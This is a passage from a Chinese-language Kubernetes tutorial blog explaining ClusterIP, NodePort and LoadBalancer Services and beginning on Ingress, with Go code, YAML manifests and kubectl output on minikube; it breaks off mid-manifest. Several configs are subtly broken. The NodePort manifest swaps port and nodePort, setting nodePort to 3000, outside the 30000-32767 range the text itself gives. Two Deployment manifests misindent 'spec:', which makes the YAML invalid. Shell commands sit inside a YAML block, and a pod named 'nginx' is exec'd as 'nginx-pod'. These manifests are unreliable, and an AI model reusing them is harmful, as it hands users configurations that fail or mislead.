阿里云密码<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/rollingupdate.png" alt="rollingupdate"></p><h1 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h1><p>经过前面几节的练习，可能你会有一些疑惑：</p><ul><li>为什么 pod 不就绪 (Ready) 的话，<code>kubernetes</code> 不会将流量重定向到该 pod，这是怎么做到的？</li><li>前面访问服务的方式是通过 <code>port-forword</code> 将 pod 的端口暴露到本地，不仅需要写对 pod 的名字，一旦 deployment 重新创建新的 pod，pod 名字和 IP 地址也会随之变化，如何保证稳定的访问地址呢？。</li><li>如果使用 deployment 部署了多个 Pod 副本，如何做负载均衡呢？</li></ul><p><code>kubernetes</code> 提供了一种名叫 <code>Service</code> 的资源帮助解决这些问题，它为 pod 提供一个稳定的 Endpoint。Service 位于 pod 的前面，负责接收请求并将它们传递给它后面的所有pod。一旦服务中的 Pod 集合发生更改，Endpoints 就会被更新，请求的重定向自然也会导向最新的 pod。</p><h2 id="ClusterIP"><a href="#ClusterIP" class="headerlink" title="ClusterIP"></a>ClusterIP</h2><p>我们先来看看 <code>Service</code> 默认使用的 <code>ClusterIP</code> 类型，首先做一些准备工作，在之前的 <code>hellok8s:v2</code> 版本上加上返回当前服务所在的 <code>hostname</code> 功能，升级到 <code>v3</code> 版本。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hello</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>host, _ := os.Hostname()<br>io.WriteString(w, fmt.Sprintf(<span class="hljs-string">&quot;[v3] Hello, Kubernetes!, From host: %s&quot;</span>, host))<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, hello)<br>http.ListenAndServe(<span class="hljs-string">&quot;:3000&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Dockerfile</code> 和之前保持一致，打包 <code>tag=v3</code> 并推送到远程仓库。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker build . -t hellok8s:v3<br>docker push hellok8s:v3<br></code></pre></td></tr></table></figure><p>修改 deployment 的 <code>hellok8s</code> 为 <code>v3</code> 版本。执行 <code>kubectl apply -f deployment.yaml</code> 更新 deployment。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-deployment</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-container</span><br>          <span class="hljs-attr">image:</span> <span class="hljs-string">crpi-g07m1i4cb9anpvun.cn-hangzhou.personal.cr.aliyuncs.com/xpshub/k8s:v3</span><br>      <span class="hljs-attr">imagePullSecrets:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">阿里云密码</span><br></code></pre></td></tr></table></figure><p>接下来是 <code>Service</code> 资源的定义，我们使用 <code>ClusterIP</code> 的方式定义 Service，通过 <code>kubernetes</code> 集群的内部 IP 暴露服务，当我们只需要让集群中运行的其他应用程序访问我们的 pod 时，就可以使用这种类型的Service。首先创建一个 service-hellok8s-clusterip.yaml 文件。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">service-hellok8s-clusterip</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">ClusterIP</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>  <span class="hljs-attr">ports:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">3000</span><br>    <span class="hljs-attr">targetPort:</span> <span class="hljs-number">3000</span><br></code></pre></td></tr></table></figure><p>首先通过 <code>kubectl get endpoints</code> 来看看 Endpoint。被 selector 选中的 Pod，就称为 Service 的 Endpoints。它维护着 Pod 的 IP 地址，只要服务中的 Pod 集合发生更改，Endpoints 就会被更新。通过 <code>kubectl get pod -o wide</code> 命令获取 Pod 更多的信息，可以看到 3 个 Pod 的 IP 地址和 Endpoints 中是保持一致的，你可以试试增大或减少 Deployment 中 Pod 的 replicas，观察 Endpoints 会不会发生变化。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl apply -f service-hellok8s-clusterip.yaml<br><br>kubectl get endpoints<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                         ENDPOINTS                                          AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">service-hellok8s-clusterip   172.17.0.10:3000,172.17.0.2:3000,172.17.0.3:3000   10s</span><br><br>kubectl get pod -o wide<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                                   READY   STATUS    RESTARTS   AGE    IP           NODE</span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-5d5545b69c-24lw5   1/1     Running   0          112s   172.17.0.7   minikube</span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-5d5545b69c-9g94t   1/1     Running   0          112s   172.17.0.3   minikube</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-5d5545b69c-9gm8r   1/1     Running   0          112s   172.17.0.2   minikube</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">nginx                                  1/1     Running   0          112s   172.17.0.9   minikube</span><br><br>kubectl get service<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                         TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)    AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">service-hellok8s-clusterip   ClusterIP   10.104.96.153   &lt;none&gt;        3000/TCP   10s</span><br></code></pre></td></tr></table></figure><p>接着我们可以通过在集群其它应用中访问 <code>service-hellok8s-clusterip</code> 的 IP 地址 <code>10.104.96.153</code> 来访问 <code>hellok8s:v3</code> 服务。</p><p>但是<code>ClusterIP</code> 的方式只能集群内部访问，不能容器外部访问</p><p>这里通过在集群内创建一个 <code>nginx</code> 来访问 <code>hellok8s</code> 服务。创建后进入 <code>nginx</code> 容器来用 <code>curl</code> 命令访问 <code>service-hellok8s-clusterip</code> 。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">nginx-container</span><br>      <span class="hljs-attr">image:</span> <span class="hljs-string">nginx</span><br><span class="hljs-string">kubectl</span> <span class="hljs-string">get</span> <span class="hljs-string">pods</span><br><span class="hljs-comment"># NAME                                   READY   STATUS    RESTARTS   AGE</span><br><span class="hljs-comment"># hellok8s-deployment-5d5545b69c-24lw5   1/1     Running   0          27m</span><br><span class="hljs-comment"># hellok8s-deployment-5d5545b69c-9g94t   1/1     Running   0          27m</span><br><span class="hljs-comment"># hellok8s-deployment-5d5545b69c-9gm8r   1/1     Running   0          27m</span><br><span class="hljs-comment"># nginx                                  1/1     Running   0          41m</span><br><br><span class="hljs-string">kubectl</span> <span class="hljs-string">get</span> <span class="hljs-string">service</span><br><span class="hljs-comment"># NAME                         TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)    AGE</span><br><span class="hljs-comment"># service-hellok8s-clusterip   ClusterIP   10.104.96.153   &lt;none&gt;        3000/TCP   10s</span><br><br><span class="hljs-string">kubectl</span> <span class="hljs-string">exec</span> <span class="hljs-string">-it</span> <span class="hljs-string">nginx-pod</span> <span class="hljs-string">--</span> <span class="hljs-string">/bin/bash</span><br><span class="hljs-comment"># root@nginx-pod:/# curl 10.104.96.153:3000</span><br><span class="hljs-comment"># [v3] Hello, Kubernetes!, From host: hellok8s-deployment-5d5545b69c-9gm8r</span><br><span class="hljs-comment"># root@nginx-pod:/# curl 10.104.96.153:3000</span><br><span class="hljs-comment">#[v3] Hello, Kubernetes!, From host: hellok8s-deployment-5d5545b69c-9g94t</span><br></code></pre></td></tr></table></figure><p>可以看到，我们多次 <code>curl 10.104.96.153:3000</code> 访问 <code>hellok8s</code> Service IP 地址，返回的 <code>hellok8s:v3</code> <code>hostname</code> 不一样，说明 Service 可以接收请求并将它们传递给它后面的所有 pod，还可以自动负载均衡。你也可以试试增加或者减少 <code>hellok8s:v3</code> pod 副本数量，观察 Service 的请求是否会动态变更。调用过程如下图所示：</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/service-clusterip-fix-name.png" alt="service-clusterip-fix-name"></p><p>除了上述的 <code>ClusterIp</code> 的方式外，Kubernetes <code>ServiceTypes</code> 允许指定你所需要的 Service 类型，默认是 <code>ClusterIP</code>。<code>Type</code> 的值包括如下：</p><ul><li><code>ClusterIP</code>：通过集群的内部 IP 暴露服务，选择该值时服务只能够在集群内部访问。 这也是默认的 <code>ServiceType</code>。</li><li><a href="https://kubernetes.io/docs/concepts/services-networking/service/#type-nodeport"><code>NodePort</code></a>：通过每个节点上的 IP 和静态端口（<code>NodePort</code>）暴露服务。 <code>NodePort</code> 服务会路由到自动创建的 <code>ClusterIP</code> 服务。 通过请求 <code>&lt;节点 IP&gt;:&lt;节点端口&gt;</code>，你可以从集群的外部访问一个 <code>NodePort</code> 服务。</li><li><a href="https://kubernetes.io/docs/concepts/services-networking/service/#loadbalancer"><code>LoadBalancer</code></a>：使用云提供商的负载均衡器向外部暴露服务。 外部负载均衡器可以将流量路由到自动创建的 <code>NodePort</code> 服务和 <code>ClusterIP</code> 服务上。</li><li><a href="https://kubernetes.io/docs/concepts/services-networking/service/#externalname"><code>ExternalName</code></a>：通过返回 <code>CNAME</code> 和对应值，可以将服务映射到 <code>externalName</code> 字段的内容（例如，<code>foo.bar.example.com</code>）。 无需创建任何类型代理。</li></ul><h2 id="NodePort"><a href="#NodePort" class="headerlink" title="NodePort"></a>NodePort</h2><p>我们知道<code>kubernetes</code> 集群并不是单机运行，它管理着多台节点即 <a href="https://kubernetes.io/docs/concepts/architecture/nodes/">Node</a>，可以通过每个节点上的 IP 和静态端口（<code>NodePort</code>）暴露服务。如下图所示，如果集群内有两台 Node 运行着 <code>hellok8s:v3</code>，我们创建一个 <code>NodePort</code> 类型的 Service，将 <code>hellok8s:v3</code> 的 <code>3000</code> 端口映射到 Node 机器的 <code>30000</code> 端口 (在 30000-32767 范围内)，就可以通过访问 <code>http://node1-ip:30000</code> 或者 <code>http://node2-ip:30000</code> 访问到服务。</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/service-nodeport-fix-name.png" alt="service-nodeport-fix-name"></p><p>这里以 <code>minikube</code> 为例，我们可以通过 <code>minikube ip</code> 命令拿到 k8s cluster node IP地址。下面的教程都以我本机的 <code>192.168.49.2</code> 为例，需要替换成你的 IP 地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">minikube ip<br><span class="hljs-meta prompt_"># </span><span class="language-bash">192.168.49.2</span><br></code></pre></td></tr></table></figure><p>接着以 NodePort 的 ServiceType 创建一个 Service 来接管 pod 流量。通过<code>minikube</code> 节点上的 IP <code>192.168.49.2</code> 暴露服务。 <code>NodePort</code> 服务会路由到自动创建的 <code>ClusterIP</code> 服务。 通过请求 <code>&lt;节点 IP&gt;:&lt;节点端口&gt;</code> – <code>192.168.49.2:30000</code>，你可以从集群的外部访问一个 <code>NodePort</code> 服务，最终重定向到 <code>hellok8s:v3</code> 的 <code>3000</code> 端口。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">service-hellok8s-nodeport</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">NodePort</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>  <span class="hljs-attr">ports:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">30000</span><br>    <span class="hljs-attr">nodePort:</span> <span class="hljs-number">3000</span><br></code></pre></td></tr></table></figure><p>创建 <code>service-hellok8s-nodeport</code> Service 后，使用 <code>curl</code> 命令或者浏览器访问 <code>http://192.168.49.2:30000</code> 可以得到结果。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl apply -f service-hellok8s-nodeport.yaml<br><br>kubectl get service<br><span class="hljs-meta prompt_">#</span><span class="language-bash">kubectl get services</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">NAME                         TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)          AGE</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">kubernetes                   ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP          35h</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">service-hellok8s-clusterip   ClusterIP   10.97.187.137    &lt;none&gt;        4000/TCP         20h</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">service-hellok8s-nodeport    NodePort    10.102.199.168   &lt;none&gt;        3000:30000/TCP   20h</span><br><br>kubectl get pods<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                                   READY   STATUS    RESTARTS   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-5d5545b69c-24lw5   1/1     Running   0          27m</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-5d5545b69c-9g94t   1/1     Running   0          27m</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-5d5545b69c-9gm8r   1/1     Running   0          27m</span><br><br>curl http://192.168.49.2:30000<br><span class="hljs-meta prompt_"># </span><span class="language-bash">[v3] Hello, Kubernetes!, From host: hellok8s-deployment-5d5545b69c-9g94t</span><br><br>curl http://192.168.49.2:30000<br><span class="hljs-meta prompt_"># </span><span class="language-bash">[v3] Hello, Kubernetes!, From host: hellok8s-deployment-5d5545b69c-24lw5</span><br></code></pre></td></tr></table></figure><p>如果本地使用 Docker Desktop（minikube start –driver&#x3D;docker）的话，那你大概率无法通过<code>minikube ip</code>获取到的ip地址来请求,因为 docker 部分网络限制导致无法通过 ip 直连 docker container，这代表 NodePort 类型的 Service、Ingress 组件都无法通过 minikube ip 提供的 ip 地址来访问。无法直接访问Node IP。你可以通过<code>minikube service service-hellok8s-nodeport --url</code>来公开服务，然后通过<code>curl</code>或者浏览器访问。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">minikube service service-hellok8s-nodeport --url<br><span class="hljs-meta prompt_"># </span><span class="language-bash">http://127.0.0.1:50896</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Because you are using a Docker driver on windows, the terminal needs to be open to run it.</span><br>curl http://127.0.0.1:50896<br><span class="hljs-meta prompt_"># </span><span class="language-bash">[v3] Hello, Kubernetes!, From host: hellok8s-deployment-559cfdd58c-zp2pc</span><br>curl http://127.0.0.1:50896<br><span class="hljs-meta prompt_"># </span><span class="language-bash">[v3] Hello, Kubernetes!, From host: hellok8s-deployment-559cfdd58c-2j2x2</span><br></code></pre></td></tr></table></figure><h2 id="LoadBalancer"><a href="#LoadBalancer" class="headerlink" title="LoadBalancer"></a>LoadBalancer</h2><p><a href="https://kubernetes.io/docs/concepts/services-networking/service/#loadbalancer"><code>LoadBalancer</code></a> 是使用云提供商的负载均衡器向外部暴露服务。 外部负载均衡器可以将流量路由到自动创建的 <code>NodePort</code> 服务和 <code>ClusterIP</code> 服务上，假如你在 <a href="https://aws.amazon.com/">AWS</a> 的 <a href="https://aws.amazon.com/eks/">EKS</a> 集群上创建一个 Type 为 <code>LoadBalancer</code> 的 Service。它会自动创建一个 ELB (<a href="https://aws.amazon.com/elasticloadbalancing">Elastic Load Balancer</a>) ，并可以根据配置的 IP 池中自动分配一个独立的 IP 地址，可以供外部访问。</p><p>这里因为我们使用的是 <code>minikube</code>，可以使用 <code>minikube tunnel</code> 来辅助创建 LoadBalancer 的 <code>EXTERNAL_IP</code>，具体教程可以查看<a href="https://minikube.sigs.k8s.io/docs/handbook/accessing/#loadbalancer-access">官网文档</a>，但是和实际云提供商的 LoadBalancer 还是有本质区别，所以 <a href="https://github.com/guangzhengli/kubernetes_workshop">Repository</a> 不做更多阐述，有条件的可以使用 <a href="https://aws.amazon.com/">AWS</a> 的 <a href="https://aws.amazon.com/eks/">EKS</a> 集群上创建一个 ELB (<a href="https://aws.amazon.com/elasticloadbalancing">Elastic Load Balancer</a>) 试试。</p><p>下图显示 LoadBalancer 的 Service 架构图。</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/service-loadbalancer-fix-name.png" alt="service-loadbalancer-fix-name"></p><h1 id="Ingress"><a href="#Ingress" class="headerlink" title="Ingress"></a>Ingress</h1><p><a href="https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.25/#ingress-v1beta1-networking-k8s-io">Ingress</a> 公开从集群外部到集群内<a href="https://kubernetes.io/docs/concepts/services-networking/service/">服务</a>的 HTTP 和 HTTPS 路由。 流量路由由 Ingress 资源上定义的规则控制。Ingress 可为 Service 提供外部可访问的 URL、负载均衡流量、 SSL&#x2F;TLS，以及基于名称的虚拟托管。你必须拥有一个 <a href="https://kubernetes.io/zh-cn/docs/concepts/services-networking/ingress-controllers">Ingress 控制器</a> 才能满足 Ingress 的要求。 仅创建 Ingress 资源本身没有任何效果。 <a href="https://kubernetes.io/docs/concepts/services-networking/ingress-controllers">Ingress 控制器</a> 通常负责通过负载均衡器来实现 Ingress，例如 <code>minikube</code> 默认使用的是 <a href="https://minikube.sigs.k8s.io/docs/tutorials/nginx_tcp_udp_ingress/">nginx-ingress</a>，目前 <code>minikube</code> 也支持 <a href="https://minikube.sigs.k8s.io/docs/handbook/addons/kong-ingress/">Kong-Ingress</a>。</p><p>Ingress 可以“简单理解”为服务的网关 Gateway，它是所有流量的入口，经过配置的路由规则，将流量重定向到后端的服务。</p><p>在 <code>minikube</code> 中，可以通过下面命令开启 Ingress-Controller 的功能。默认使用的是 <a href="https://minikube.sigs.k8s.io/docs/tutorials/nginx_tcp_udp_ingress/">nginx-ingress</a>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">minikube addons enable ingress<br></code></pre></td></tr></table></figure><p>接着删除之前创建的所有 <code>pod</code>, <code>deployment</code>, <code>service</code> 资源。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl delete deployment,service --all<br></code></pre></td></tr></table></figure><p>接着根据之前的教程，创建 <code>hellok8s:v2</code> 和 <code>hellok8s:v1</code> 的<code>deployment</code>与 <code>service</code> 资源。Service 的 type 为 ClusterIP 即可。</p><p><code>hellok8s:v2</code> 的端口映射为 <code>4000:3000</code>，<code>hellok8s:v1</code> 的端口映射为 <code>5000:3000</code>，这里后续写 Ingress Route 规则时会用到。</p><p><code>hellok8s</code>配置:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">service-hellok8sv2-clusterip</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">ClusterIP</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8sv2</span><br>  <span class="hljs-attr">ports:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">4000</span><br>    <span class="hljs-attr">targetPort:</span> <span class="hljs-number">3000</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8sv2-deployment</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8sv2</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8sv2</span><br>     <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8sv2-container</span><br>          <span class="hljs-attr">image:</span> <span class="hljs-string">crpi-g07m1i4cb9anpvun.cn-hangzhou.personal.cr.aliyuncs.com/xpshub/k8s:v2</span><br>      <span class="hljs-attr">imagePullSecrets:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">阿里云密码</span><br></code></pre></td></tr></table></figure><p><code>nginx</code>配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">service-hellok8sv1-clusterip</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">ClusterIP</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8sv1</span><br>  <span class="hljs-attr">ports:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">5000</span><br>    <span class="hljs-attr">targetPort:</span> <span class="hljs-number">3000</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8sv1-deployment</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">2</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8sv1</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8sv1</span><br>     <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8sv1-container</span><br>          <span class="hljs-attr">image:</span> <span class="hljs-string">crpi-g07m1i4cb9anpvun.cn-hangzhou.personal.cr.aliyuncs.com/xpshub/k8s:v1</span><br>      